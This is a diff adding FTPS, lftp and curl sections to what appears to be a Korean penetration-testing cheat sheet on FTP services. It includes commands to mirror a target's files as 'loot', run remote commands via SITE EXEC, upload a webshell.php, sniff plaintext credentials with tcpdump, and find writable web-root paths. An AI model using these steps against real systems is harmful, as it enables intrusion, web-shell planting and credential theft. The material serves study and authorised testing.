@@ -102,3 +102,68 @@ mget *    # 모든 파일 다운로드
 mput *    # 모든 파일 업로드
 ls -la    # 숨겨진 파일 포함 목록
 ```
+
+---
+
+## FTPS / FTP over TLS
+
+FTP 위에 TLS 를 얹은 형태. 보통 21(Explicit FTPS) 또는 990(Implicit FTPS).
+
+```bash
+# Explicit FTPS (AUTH TLS)
+lftp -u user,pass ftps://TARGET:21
+
+# Implicit FTPS
+lftp -u user,pass ftps://TARGET:990
+
+# 인증서 검증 건너뛰기 (자체 서명)
+lftp -e 'set ssl:verify-certificate no' -u user,pass ftps://TARGET
+
+# curl
+curl -k --ssl-reqd -u user:pass ftp://TARGET/
+```
+
+---
+
+## lftp 고급 사용
+
+`ftp` 보다 스크립트 친화적이고 재귀 업/다운 지원.
+
+```bash
+# 익명 재귀 미러
+lftp -e "set ftp:anon-pass ''; mirror --parallel=5 / /tmp/loot; bye" anonymous@TARGET
+
+# 자격증명 + 업로드
+lftp -u user,pass TARGET -e "mirror -R /local /remote; bye"
+
+# 사이트 명령(원격 쉘 명령 - ProFTPd 등 일부 서버)
+lftp -u user,pass TARGET -e "quote SITE EXEC id; bye"
+```
+
+---
+
+## curl 원라이너
+
+```bash
+# 디렉토리 리스팅
+curl -s ftp://anonymous:@TARGET/
+
+# 파일 가져오기
+curl -u user:pass ftp://TARGET/file -o file
+
+# 업로드
+curl -T webshell.php -u user:pass ftp://TARGET/
+
+# 자격증명 유출 감시 (평문)
+tcpdump -i any -A -s0 'tcp port 21' | grep -iE 'USER|PASS'
+```
+
+---
+
+## 유의사항
+
+!!! warning "평문 전송"
+    일반 FTP(21) 는 자격증명/데이터를 평문 전송한다. 동일 L2 구간이면 `tcpdump` / `ettercap` 으로 스니핑 가능.
+
+!!! tip "쓰기 디렉토리 탐색"
+    `put test.txt` → `quote SITE CHMOD 777 test.txt` 로 쓰기 가능한 경로를 빠르게 확인. 웹루트와 오버랩되는지(`/var/www/html`, `wwwroot`) 확인 우선.
